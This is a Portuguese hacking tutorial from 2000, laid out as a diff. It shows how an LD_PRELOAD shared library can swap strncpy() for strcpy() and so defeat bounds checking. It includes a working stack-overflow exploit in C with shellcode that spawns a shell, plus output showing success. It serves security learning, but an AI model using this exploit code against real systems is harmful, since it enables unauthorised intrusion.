@@ -1,0 +1,364 @@
+###########################################################################
+###########################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Agosto/00
+
+OBS: Todos os dados e exemplos disponibilizados neste artigo possuem
+     somente propositos educacionais.O autor nao se responsabiliza pelo
+     mau uso dos mesmos.
+
+OBS2: Mais um artigo onde o publico alvo eh o pessoal 'NewBie' Fucador.
+      Se voce eh elite ou se considera 'elite', favor nao ler este texto!
+
+
+		  *************************************
+		  *    REDIRECIONAMENTO DE FUNCOES    *
+		  *************************************
+
+-------------------------------- INDICE ------------------------------------
+
+1. INTRODUCAO.
+   1.1. - Objetivo
+2. TECNICA DE REDIRECIONAMENTO.
+3. PROBLEMAS E SUGESTOES.
+4. TERMINANDO.
+   4.1. - Links e Referencias.
+   4.2. - Consideracoes Finais.
+
+----------------------------------------------------------------------------
+
+--------------
+1. INTRODUCAO |
+--------------
+
+O motivo principal deu estar escrevendo este artigo, eh porque a tecnica
+que eu irei descrever eh bela, mas no momento eu nao consegui contemplar
+uma utilidade para a mesma.Eh uma tecnica que pode num futuro,quem sabe, 
+ser de grande valia e quem sabe realmente, alguem possa descobrir
+um furo ou um jeito de implementa-la de forma mais eficiente.Achei um dever
+meu publicar este artigo, mesmo nao contemplando esquemas eficazes no uso 
+desta tecnica, por achar que mais importante do que EU dominar uma tecnica
+eh dar a oportunidade para que uma geracao futura ou alguem com conhecimentos
+maiores do que os meus possa dar continuidade as linhas que irei descrever
+aqui.A utilidade atual desta tecnica eh quase nenhuma! Por isso, se voce
+estah querendo uma receita de bolo eficaz, eh bom ir parando por aqui!
+Mas se voce quer dominar uma carta que num futuro proximo possa vir a
+ser util, vah em frente! Recomendo ir mais alem do que eu consegui chegar
+e contemplar teorias a serem criadas em cima de cada implementacao que 
+possa vir a surgir.
+
+
+1.1. - Objetivo
+----------------
+
+O Objetivo principal deste artigo eh demonstrar de forma pratica e 
+mais simples e clara possivel, a interceptacao de um funcao considerada
+segura como 'strncpy()' e um redirecionamento de argumentos da mesma para
+o retorno de uma funcao insegura como 'strcpy()'.Na pratica, um programa
+que teoricamente nao poderia ser exploitado com simples tecnicas de
+buffer overflows poderia ser um alvo em potencial em vista da interceptacao
+e redirecionamento de funcoes.Contemple voce mesmo as possiveis 
+implementacoes desta tecnica se os obstaculos forem ultrapassados!:)
+
+-------------------------------
+2. TECNICA DE REDIRECIONAMENTO |
+-------------------------------
+
+Enquanto estudava os possiveis esquemas para 'inutilizar' a ferramenta
+de protecao contra Buffer Overflows 'LibSafe', me deparei que o proprio
+conceito usado pela ferramenta poderia ser expandido e em alguns casos
+nao soh usado contra a mesma, mas tambem contra a seguranca de um programa
+considerado 'seguro'.
+Basicamente a tecnica consiste em interceptar uma determinada funcao
+considerada segura no que diz respeito a 'checagem de bounds' e retornar
+uma funcao insegura recebendo argumentos da mesma.
+
+Por exemplo, um programa possui em seu codigo fonte a funcao strncpy()
+recebendo argumentos da linha de comando e checando o tamanho da variavel
+que recebe esses argumentos, interceptando esta funcao, podemos atraves
+de um redirecionamento, pegar os argumentos que ela recebeu, e retorna-los
+em outra funcao, uma funcao insegura, como strcpy().
+
+2.1 - Shared Library
+---------------------
+
+A tecnica consiste em usar Shared Library para interagir com os programas
+e intercepta-los.Mais informacoes sobre 'Shared Libraries' de uma lida
+no 'Tutorial de Programacao Basica para Fucadores' feito por mim e que
+pode ser obtido na pagina do Unsekurity Team.
+
+2.2 - Exemplo de Interceptador & Redirecionador
+------------------------------------------------
+
+O codigo abaixo eh o responsavel direto pela interceptacao e
+redirecionamento da funcao:
+
+--------------------------- interfunc.c ----------------------------------
+/* Interceptador de Funcoes!!
+   Intercepta strncpy() e retorna strcpy().
+   Desenvolvido por Nash Leon com base na LibSafe.
+   nashleon@yahoo.com.br */
+
+#include <stdio.h>
+#include <stdarg.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+#include <dlfcn.h>
+
+
+typedef char *(*strcpy_t)  (char *dest, const char *src);
+typedef char *(*strncpy_t) (char *dest, const char *src, size_t n);
+typedef void *(*memcpy_t)  (void *dest, const void *src, size_t n);
+
+static void *stack_start = NULL;
+
+/* Retorna um ponteiro para a implementacao de 'funcName' na biblioteca
+   libc.Se ele nao encontra, termina o programa */
+
+static void *getLibraryFunction(const char *funcName)
+{
+void *res;
+
+if ((res = dlsym(RTLD_NEXT, funcName)) == NULL) {
+   fprintf(stderr, "dlsym %s error:%s\n", funcName,dlerror());
+   _exit(1);
+        }
+ return res;
+}
+
+char *strncpy(char *dest, const char *src, size_t n)
+{
+ static memcpy_t real_memcpy = NULL;
+ static strcpy_t real_strcpy;
+ static strncpy_t real_strncpy;
+
+ if (real_memcpy == NULL) {
+ real_memcpy = (memcpy_t) getLibraryFunction("memcpy");
+ real_strcpy = (strcpy_t) getLibraryFunction("strcpy");
+ real_strncpy = (strncpy_t) getLibraryFunction("strncpy");
+ }
+ return real_strcpy(dest, src);
+}
+
+------------------------------------------------------------------------- 
+
+Para criarmos a shared usamos o seguinte esquema:
+
+# gcc -fPIC -c interfunc.c
+# ld -shared -o intefunc.so interfunc.o -ldl
+
+Vamos criar um arquivo alvo para efeitos didaticos:
+
+-------------------------------- alvo.c ----------------------------------
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+
+main(int argc, char *argv[]){
+char buffer[512];
+if(argc < 2){
+printf("Uso: %s <string>\n",argv[0]);
+exit(0);
+}
+setuid(getuid());
+strncpy(buffer,argv[1],sizeof(buffer)-1);
+printf("Seja bem vindo %s.\n",buffer);
+}
+--------------------------------------------------------------------------
+
+# gcc -o alvo alvo.c
+
+Note que o programa acima possui a funcao strncpy().
+Abaixo segue um simples exploit para 'Stack Overflow' que irah tentar
+exploitar o programa acima.
+
+----------------------------- exploit.c ----------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define   NOP              0x90
+#define   OFFSET              0
+#define   ALIGN               0
+
+/* Defina o PATH do programa alvo. */
+
+#define   PATH    "./alvo"
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+/* Shellcode /bin/bash1. Veja se voce a possui, se nao possuir,
+   altere o shellcode abaixo para um qualquer. */
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x0b\x31\xc0\x88\x46\x0a\x89"
+        "\x46\x0f\xb0\x0b\x89\xf3\x8d\x4e\x0b\x8d\x56\x0f"
+        "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
+        "\xff\xff/bin/bash1";
+
+int main(int argc, char *argv[])
+{
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+retaddr = pega_sp() - offset;
+for (i=0;i<tamanho;i+=4)
+
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+execl(PATH,PATH,buffer,0);
+}
+-------------------------------------------------------------------------
+
+$ gcc -o exploit exploit.c
+$ ls -l alvo
+-rwxr-xr-x   1 root     root        12101 Aug 24 08:53 alvo*
+
+Agora vamos tentar exploitar o programa original.
+
+$ ./exploit 550
+Seja bem vindo  XXXXXXXXXXXXX
+XXXX (muito lixo)...
+XXXXX
+Üÿÿÿ/bin/bash1ÿ¿ú
+
+Nao conseguimos, pois a funcao strncpy() estah barrando nossa
+'exploitacao'.
+
+Abaixo segue a implementacao da 'tecnica':
+
+$ LD_PRELOAD=./interfunc.so
+$ export LD_PRELOAD
+$ ./exploit 550
+Seja bem vindo 
+(Muito Lixo)
+I1UØ@IèÜÿÿÿ/bin/bash1ÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿ø
+ùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿øùÿ¿.
+bash$
+
+
+Aih estah irmao.Funciona perfeitamente! Mas tem suas limitacoes.
+
+-------------------------
+3. PROBLEMAS E SUGESTOES |
+-------------------------
+
+Ateh o exato momento, eu ainda nao consegui faze-la funcionar em um
+programa suid.Como nos carregamos a shared via environment 'LD_PRELOAD',
+estamos limitados ao nosso ambiente.Se o programa for suid, ela nao
+terah efeito.Voce poderia tentar uma engenharia social em busca de
+carregar um trojan, mas existem milhares de esquemas com Trojans melhores
+que este, logo, a tecnica torna 'futil'.
+Enquanto nao surgem boas implementacoes cabe a cada um de nos conhecermos
+a fundo as possibilidades abrangentes disso, e se amanha aparecer um
+furo, poderemos, quem sabe, ser bem sucedido numa investida qualquer!
+
+--------------
+4. TERMINANDO |
+--------------
+
+O que fica evidenciado eh que eh possivel interceptar e redirecionar uma 
+funcao "segura" para outra menos segura, no entanto, sao varios os
+obstaculos e os irmaos Fucadores devem perseguir um esquema 'concreto'
+para a implementacao desta tecnica.A implementacao dela deve constituir
+uma poderosa ferramenta em prol de um ganho de 'Local Root', na quebra
+efetiva de 'LibSafe' dentre outras teorias que sao bem mais expansivas!
+Cabe a cada um de nos perseguir 'brechas' nos Sistemas Operacionais que
+torne possivel o redirecionamento 'fora environment'.Se existir a
+condicao de redirecionamento,'O SISTEMA EH TEU!!'!!:).
+
+4.1. - Links e Referencias
+---------------------------
+
+Eu escrevi um material basico sobre Shared Library, de uma olhada na
+pagina do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+
+* Outros Links Interessantes:
+------------------------------
+
+http://www.taldowin.com.br/
+http://www.absoluta.org/
+http://www.hacker.com.br/
+http://www.securenet.com.br/
+http://www.bufferoverflow..org/
+
+4.2. - Consideracoes Finais
+----------------------------
+
+Se voce leu este artigo pode contemplar que eu ando pesquisando um pouco
+e ando muito ocupado!! Estou num projeto e no momento estou priorizando
+ele somente! Os demais tutoriais estao a caminho, mas devem demorar mais
+ainda, logo, paciencia irmao! 
+
+A Mail List tem crescido e a troca de informacoes aos poucos vem 
+aumentando.Foi lah que eu expus primeiramente esta tecnica e este artigo.
+Todos do Unsekurity Team tem trabalhado e procurado disponibilizar
+informacoes em todos os niveis, buscando atingir aqueles que estao
+interessados em aprender.
+
+Eu tenho feito duras criticas a algumas 'entidades', sites e pessoas,
+nao procuro atingi-las diretamente e sim os conceitos defendidos por elas.
+Este artigo pode ser inutil para muita gente, para outros, pode ser um
+passo dado numa eterna corrida em prol de um maior aprendizado! O que
+diferencia o cara bom do mediocre, nao eh o conhecimento em sih! E sim
+o que ele faz com o conhecimento!! Voce pode aprender tudo que eu escrevi
+aqui, mas se nao der mais passos e buscar voce mesmo ir mais alem, tudo
+que aprendeu aqui terah sido em vao!
+
+Eu gostaria de agradecer mais uma vez a todos do Unsekurity Team e aqueles
+que tem acompanhado as nossas publicacoes.Tem muito o que ser feito
+ainda irmaos.Nosso grupo estah crescendo, nao soh em numero de pessoas,
+mas em qualidade tambem!! Eu sou um que estou aprendendo muito com a
+troca de informacoes que tem sido provido entre os fucadores!! Melhor
+do que simplesmente trocar shell eh aprender como conquista-las! 
+
+O Hacking Etico ainda existe e nao eh nenhuma utopia defender a etica
+na sua essencia!! Se voce acha que deve radicalizar, pense!!! O maior
+modo de radicalizar eh fazer aquilo que os poderosos nao querem que
+voce faca, ou seja, pensar!!! Se voce acha que radicalizar eh mudar
+uma Home Page, eh bom pensar e pensar muito!!! Comece pensando em quem
+estah ganhando e quem estah perdendo quando voce altera uma home page!!
+
+Seja critico irmao NewBie!
+
+Um Abraco.
+
+						Nash Leon.
+
+-------------------------------- EOF ------------------------------------
